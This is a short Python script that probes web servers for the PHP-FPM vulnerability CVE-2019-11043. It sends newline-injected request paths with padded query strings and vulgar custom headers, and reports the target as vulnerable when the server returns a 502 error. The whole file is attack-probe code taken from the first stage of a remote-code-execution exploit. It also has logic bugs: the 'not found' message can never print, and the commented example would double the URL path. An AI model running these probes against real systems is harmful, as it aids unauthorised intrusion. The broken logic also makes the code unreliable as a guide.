#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @FileName  :CVE-2019-11043.py
# @Time      :2023/4/3 14:03
# @Author    :Raink

 # http://192.168.1.152:8080/index.php


import requests

def connect(ip):
    url=f"{ip}/index.php"
    tmplist = []
    headers = {"User-Agent": "Mozilla/5.0",
               "D-Pisos": "8=D",
               "Ebut": "mamku tvoyu"
               }
    for i in range(1499, 1900):
        res = requests.get(url + "/PHP%0Ais_the_shittiest_lang.php?" + "Q" * i, headers=headers)
        # print(headers)
        if res.status_code == 502:
            tmplist.append(i-10)
            tmplist.append(i-5)
            tmplist.append(i)
            if len(tmplist) == 0:
                print('暂未发现漏洞')
                return None
            else:
                print("发现CVE-2019-11043漏洞")
            break

# connect("http://192.168.28.128:8080/index.php")
